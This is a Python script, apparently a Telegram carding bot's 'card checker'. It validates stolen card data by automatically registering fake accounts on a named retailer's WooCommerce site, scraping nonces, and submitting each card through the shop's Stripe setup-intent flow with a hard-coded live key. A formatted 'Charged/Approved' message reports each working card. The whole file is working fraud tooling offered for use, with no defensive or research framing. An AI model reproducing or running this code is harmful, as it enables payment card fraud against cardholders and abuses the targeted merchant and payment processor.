import aiohttp
import asyncio
import re
import random
import string
import os
import logging
from datetime import datetime
import ssl
import json

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

class AdvancedCardChecker:
    def __init__(self):
        self.proxy_pool = []
        self.load_proxies()
        self.request_timeout = aiohttp.ClientTimeout(total=70)  # Increased timeout
        self.max_concurrent = 3
        self.stripe_key = "pk_live_51JwIw6IfdFOYHYTxyOQAJTIntTD1bXoGPj6AEgpjseuevvARIivCjiYRK9nUYI1Aq63TQQ7KN1uJBUNYtIsRBpBM0054aOOMJN"
        self.bin_cache = {}
        self.admin_username = "FNxElectra"
        self.blacklist_file = 'blacklist.txt'
        self.blacklist = self.load_blacklist()
        self.blacklist.update(['559888', '415464'])
        self.save_blacklist()

    def load_proxies(self):
        if os.path.exists('proxies.txt'):
            with open('proxies.txt', 'r') as f:
                self.proxy_pool = [line.strip() for line in f if line.strip()]

    def load_blacklist(self):
        if os.path.exists(self.blacklist_file):
            with open(self.blacklist_file, 'r') as f:
                return set(line.strip() for line in f if line.strip())
        return set()

    def save_blacklist(self):
        with open(self.blacklist_file, 'w') as f:
            for bin in sorted(self.blacklist):
                f.write(bin + '\n')

    async def fetch_nonce(self, session, url, pattern):
        try:
            async with session.get(url) as response:
                html = await response.text()
                match = re.search(pattern, html)
                if match:
                    return match.group(1)
                logger.info(f"No nonce found in {url}")
                return None
        except Exception as e:
            logger.error(f"Nonce fetch error for {url}: {str(e)}")
            return None

    def generate_random_account(self):
        name = ''.join(random.choices(string.ascii_lowercase, k=10))
        numbers = ''.join(random.choices(string.digits, k=4))
        return f"{name}{numbers}@yahoo.com"

    async def fetch_bin_info(self, bin_number):
        try:
            if bin_number in self.bin_cache:
                return self.bin_cache[bin_number]
            async with aiohttp.ClientSession() as session:
                async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as response:
                    if response.status == 200:
                        data = await response.json()
                        self.bin_cache[bin_number] = {
                            'scheme': data.get('brand', 'N/A').capitalize(),
                            'type': data.get('type', 'N/A'),
                            'brand': data.get('brand', 'N/A').capitalize(),
                            'prepaid': 'N/A',
                            'country': data.get('country_name', 'N/A'),
                            'bank': data.get('bank', 'N/A'),
                            'level': data.get('level', 'N/A'),
                            'country_flag': data.get('country_flag', '')
                        }
                        return self.bin_cache[bin_number]
                    else:
                        logger.error(f"BIN lookup failed with status {response.status}")
                        return None
        except Exception as e:
            logger.error(f"BIN lookup error: {str(e)}")
            return None

    async def format_approval_message(self, combo, bin_info, check_time, user=None):
        bin_info = bin_info or {}
        username = user.username if user and user.username else user.full_name if user else 'Scraper'
        return f"""
<b>𝐀𝐮𝐭𝐡𝐨𝐫𝐢𝐳𝐞𝐝✅</b>

[ϟ]𝘾𝘼𝙍𝘿 -» <code>{combo}</code>
[ϟ]𝙎𝙏𝘼𝙏𝙐𝙎 -» 𝐂𝐡𝐚𝐫𝐠𝐞𝐝 1$
[ϟ]𝙂𝘼𝙏𝙀𝙒𝘼𝙔 -» <code>𝐒𝐭𝐫𝐢𝐩𝐞</code>
<b>[ϟ]𝗥𝗘𝗦𝗣𝗢𝗡𝗦𝗘 -»: <code>𝐂𝐡𝐚𝐫𝐠𝐞𝐝 𝐒𝐮𝐜𝐜𝐞𝐬𝐬𝐟𝐮𝐥𝐥𝐲</code></b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[ϟ]𝘽𝙄𝙉 -» <code>{bin_info.get('scheme', 'N/A')} {bin_info.get('type', '')}</code>
[ϟ]𝘽𝘼𝙉𝙆 -» <code>{bin_info.get('bank', 'N/A')}</code>
<b>[ϟ]𝘾𝙊𝙐𝙉𝙏𝙍𝙔 -» <code>{bin_info.get('country', 'N/A')}</code></b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝙏𝙄𝙈𝙀 -» <code>{check_time:.2f}s</code>
<b>[⌬]𝐏𝐑𝐎𝐗𝐘 -» [ NONE ]</b>

━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━ ━

[⌬]𝐂𝐇𝐄𝐂𝐊𝐄𝐃 𝐁𝐘 -» @fn_only_approved
[⌬]𝐃𝐄𝐕 -» https://t.me/{self.admin_username}
[み]𝗕𝗼𝘁 -» @FN_CHECKERR_BOT
"""

    async def make_request(self, session, method, url, data=None, retries=3, backoff_factor=1):
        """Helper function to make HTTP requests with retries and exponential backoff."""
        for attempt in range(retries):
            try:
                if method == 'get':
                    async with session.get(url) as response:
                        return response, await response.text()
                elif method == 'post':
                    async with session.post(url, data=data) as response:
                        return response, await response.text()
            except aiohttp.ClientConnectionError as e:
                if "APPLICATION_DATA_AFTER_CLOSE_NOTIFY" in str(e):
                    logger.warning(f"SSL error on attempt {attempt+1}/{retries} for {url}: {e}")
                if attempt < retries - 1:
                    delay = backoff_factor * (2 ** attempt)
                    logger.warning(f"Retrying {url} after {delay}s due to {e}")
                    await asyncio.sleep(delay)
                else:
                    logger.error(f"Request failed for {url} after {retries} attempts: {e}")
                    return None, None
            except Exception as e:
                logger.error(f"Unexpected error for {url}: {e}")
                return None, None
        return None, None

    async def process_line(self, user_id, combo, semaphore):
        start_time = datetime.now()
        async with semaphore:
            try:
                # Validate combo format
                if len(combo.split("|")) != 4:
                    logger.info(f"Invalid combo format: {combo}")
                    return None
                
                # Extract BIN and check blacklist
                cc = combo.split('|')[0]
                bin_number = cc[:6]
                if bin_number in self.blacklist:
                    logger.info(f"Skipping blacklisted BIN: {bin_number}")
                    return None
                
                # Create SSL context
                ssl_context = ssl.create_default_context()
                ssl_context.set_ciphers('DEFAULT@SECLEVEL=1')  # Allow older ciphers if needed
                ssl_context.minimum_version = ssl.TLSVersion.TLSv1_2  # Enforce TLS 1.2 or higher

                # Initialize aiohttp session with custom SSL context
                async with aiohttp.ClientSession(timeout=self.request_timeout, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
                    # Step 1: Fetch nonce for registration
                    response, html = await self.make_request(
                        session, 'get', 
                        'https://www.dragonworksperformance.com/my-account'
                    )
                    if not response or response.status != 200:
                        logger.info(f"Failed to fetch registration page: {response.status if response else 'No response'}")
                        return None
                    match = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', html)
                    if not match:
                        logger.info("Failed to fetch registration nonce")
                        return None
                    nonce = match.group(1)

                    # Step 2: Register account
                    email = self.generate_random_account()
                    reg_data = {
                        "email": email,
                        "woocommerce-register-nonce": nonce,
                        "_wp_http_referer": "/my-account/",
                        "register": "Register"
                    }
                    response, _ = await self.make_request(
                        session, 'post', 
                        'https://www.dragonworksperformance.com/my-account', 
                        data=reg_data
                    )
                    if not response or response.status != 200:
                        logger.info(f"Failed to register account: {response.status if response else 'No response'}")
                        return None
                    await asyncio.sleep(1)  # Avoid rate limits

                    # Step 3: Fetch payment nonce
                    response, html = await self.make_request(
                        session, 'get', 
                        'https://www.dragonworksperformance.com/my-account/add-payment-method/'
                    )
                    if not response or response.status != 200:
                        logger.info(f"Failed to fetch payment page: {response.status if response else 'No response'}")
                        return None
                    match = re.search(r'"createAndConfirmSetupIntentNonce":"(.*?)"', html)
                    if not match:
                        logger.info("Failed to fetch payment nonce")
                        return None
                    payment_nonce = match.group(1)

                    # Step 4: Fetch BIN info
                    bin_info = await self.fetch_bin_info(bin_number)

                    # Step 5: Process with Stripe
                    card_data = combo.split("|")
                    stripe_data = {
                        "type": "card",
                        "card[number]": card_data[0],
                        "card[cvc]": card_data[3],
                        "card[exp_year]": card_data[2][-2:],
                        "card[exp_month]": card_data[1],
                        "billing_details[address][postal_code]": "10009",
                        "billing_details[address][country]": "US",
                        "key": self.stripe_key
                    }
                    response, stripe_res = await self.make_request(
                        session, 'post', 
                        'https://api.stripe.com/v1/payment_methods', 
                        data=stripe_data
                    )
                    if not response or response.status != 200:
                        logger.info(f"Stripe payment method creation failed: {response.status if response else 'No response'}")
                        return None
                    try:
                        stripe_json = json.loads(stripe_res)
                    except json.JSONDecodeError:
                        logger.error("Invalid JSON response from Stripe")
                        return None
                    if 'id' not in stripe_json:
                        logger.info("Stripe payment method creation failed: No payment ID")
                        return None
                    payment_id = stripe_json['id']

                    # Step 6: Confirm payment
                    confirm_data = {
                        "action": "create_and_confirm_setup_intent",
                        "wc-stripe-payment-method": payment_id,
                        "_ajax_nonce": payment_nonce,
                    }
                    response, confirm_res = await self.make_request(
                        session, 'post', 
                        'https://www.dragonworksperformance.com/?wc-ajax=wc_stripe_create_and_confirm_setup_intent', 
                        data=confirm_data
                    )
                    if not response or response.status != 200:
                        logger.info(f"Payment confirmation failed: {response.status if response else 'No response'}")
                        return None
                    try:
                        confirm_json = json.loads(confirm_res)
                    except json.JSONDecodeError:
                        logger.error("Invalid JSON response from payment confirmation")
                        return None
                    if confirm_json.get("success", False) and confirm_json.get("data", {}).get("status", "") == "succeeded":
                        check_time = (datetime.now() - start_time).total_seconds()
                        return {
                            'combo': combo,
                            'message': await self.format_approval_message(combo, bin_info, check_time),
                            'bin_info': bin_info,
                            'check_time': check_time
                        }
                    logger.info(f"Payment confirmation failed for {combo}: {confirm_json.get('data', {}).get('message', 'No message')}")
                    return None

            except Exception as e:
                logger.error(f"Error processing {combo}: {str(e)}")
                return None

    async def check_card(self, combo):
        user_id = "fn_only_approved"
        semaphore = asyncio.Semaphore(self.max_concurrent)
        result = await self.process_line(user_id, combo, semaphore)
        return result
